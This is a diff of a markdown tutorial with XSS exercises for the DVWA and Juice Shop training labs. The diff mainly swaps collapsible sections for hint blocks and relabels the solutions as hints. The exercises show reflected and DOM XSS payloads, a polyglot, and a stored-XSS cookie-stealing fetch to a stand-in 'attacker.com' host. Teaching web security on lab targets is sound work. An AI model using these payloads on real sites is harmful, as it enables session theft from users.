@@ -104,16 +104,12 @@ document.getElementById('welcome').innerHTML =
 **Setup**: Start DVWA and navigate to XSS (Reflected) page  
 **Goal**: Display an alert box with your message
 
-<details>
-<summary>💡 Hint 1: Understanding the input</summary>
-
+:::hint 💡 Hint 1: Understanding the input
 Look at the form. It asks for your name. Try entering a normal name first and see how it's displayed on the page. Where does your input appear in the response?
 
-</details>
+:::
 
-<details>
-<summary>💡 Hint 2: Breaking out of context</summary>
-
+:::hint 💡 Hint 2: Breaking out of context
 Your input is being inserted into the HTML. What if you could add HTML tags? Try entering:
 ```
 John<h1>Test</h1>
@@ -121,18 +117,14 @@ John<h1>Test</h1>
 
 Did it render as HTML?
 
-</details>
+:::
 
-<details>
-<summary>💡 Hint 3: Adding JavaScript</summary>
-
+:::hint 💡 Hint 3: Adding JavaScript
 If HTML works, JavaScript should too! The `<script>` tag executes JavaScript. What would happen if you enter a script tag?
 
-</details>
+:::
 
-<details>
-<summary>🔓 Solution</summary>
-
+:::hint 🔓 Hint 4
 Enter in the name field:
 ```html
 <script>alert('XSS')</script>
@@ -152,7 +144,7 @@ The browser sees the script tag and executes it!
 <body onload=alert('XSS')>
 ```
 
-</details>
+:::
 
 ---
 
@@ -161,26 +153,20 @@ The browser sees the script tag and executes it!
 **Setup**: Navigate to XSS (Stored) page  
 **Goal**: Steal cookies and send them to your server
 
-<details>
-<summary>💡 Hint 1: Where is input stored?</summary>
-
+:::hint 💡 Hint 1: Where is input stored?
 This is a guestbook. Try posting a normal message first. Notice that your message is saved and displayed to everyone who visits the page. This is different from reflected XSS!
 
-</details>
+:::
 
-<details>
-<summary>💡 Hint 2: Accessing cookies</summary>
-
+:::hint 💡 Hint 2: Accessing cookies
 In JavaScript, you can access cookies with `document.cookie`. Try this payload first:
 ```html
 <script>alert(document.cookie)</script>
 ```
 
-</details>
+:::
 
-<details>
-<summary>💡 Hint 3: Sending data to external server</summary>
-
+:::hint 💡 Hint 3: Sending data to external server
 To steal cookies, you need to send them somewhere. You can use:
 - `fetch()` to make HTTP requests
 - `Image` object to make GET requests
@@ -188,11 +174,9 @@ To steal cookies, you need to send them somewhere. You can use:
 
 Think about how to combine `document.cookie` with these methods.
 
-</details>
+:::
 
-<details>
-<summary>🔓 Solution</summary>
-
+:::hint 🔓 Hint 4
 **Step 1**: Set up a listener (use RequestBin or ngrok)
 
 **Step 2**: Post this message:
@@ -219,7 +203,7 @@ fetch('http://attacker.com/steal', {
 
 **Explanation**: Every visitor to the guestbook will execute this script, sending their cookies to your server!
 
-</details>
+:::
 
 ---
 
@@ -228,16 +212,12 @@ fetch('http://attacker.com/steal', {
 **Setup**: Navigate to Juice Shop search page  
 **Goal**: Exploit DOM XSS in the search functionality
 
-<details>
-<summary>💡 Hint 1: Inspect the JavaScript</summary>
-
+:::hint 💡 Hint 1: Inspect the JavaScript
 Open Developer Tools and look at the JavaScript. Search for something and watch how the search term is handled. Is it inserted into the DOM directly?
 
-</details>
+:::
 
-<details>
-<summary>💡 Hint 2: Understanding the # fragment</summary>
-
+:::hint 💡 Hint 2: Understanding the # fragment
 DOM XSS often involves the URL fragment (after #). Try:
 ```
 http://localhost:3001/#/search?q=test
@@ -245,21 +225,17 @@ http://localhost:3001/#/search?q=test
 
 How is the 'q' parameter used?
 
-</details>
+:::
 
-<details>
-<summary>💡 Hint 3: Breaking the JavaScript context</summary>
-
+:::hint 💡 Hint 3: Breaking the JavaScript context
 If the search term is inserted into JavaScript, you might need to break out of a string. Try:
 ```
 test'); alert('XSS
 ```
 
-</details>
+:::
 
-<details>
-<summary>🔓 Solution</summary>
-
+:::hint 🔓 Hint 4
 Navigate to:
 ```
 http://localhost:3001/#/search?q=<iframe src="javascript:alert(`XSS`)">
@@ -280,7 +256,7 @@ document.onkeypress = function(e) {
 ">
 ```
 
-</details>
+:::
 
 ---
 
@@ -288,9 +264,7 @@ document.onkeypress = function(e) {
 
 **Goal**: Create a single XSS payload that works in multiple contexts
 
-<details>
-<summary>🎯 Challenge Description</summary>
-
+:::hint 🎯 Hint 1
 Your payload should work whether it's inserted:
 1. Between HTML tags
 2. Inside a JavaScript string
@@ -299,22 +273,18 @@ Your payload should work whether it's inserted:
 
 This is useful when you don't know the exact context.
 
-</details>
+:::
 
-<details>
-<summary>💡 Hint: Building blocks</summary>
-
+:::hint 💡 Hint 2
 Think about what characters can:
 - Close HTML attributes: `"`
 - Close JavaScript strings: `'`
 - Create new tags: `<>`
 - Execute JavaScript: `javascript:`
 
-</details>
+:::
 
-<details>
-<summary>🔓 Solution</summary>
-
+:::hint 🔓 Hint 3
 The classic XSS polyglot:
 ```
 jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
@@ -327,7 +297,7 @@ jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</
 - `</stYle/</titLe/</teXtarEa/</scRipt/` - closes various tags
 - `\x3csVg/oNloAd=alert()//>\x3e` - SVG with event handler
 
-</details>
+:::
 
 ---
 
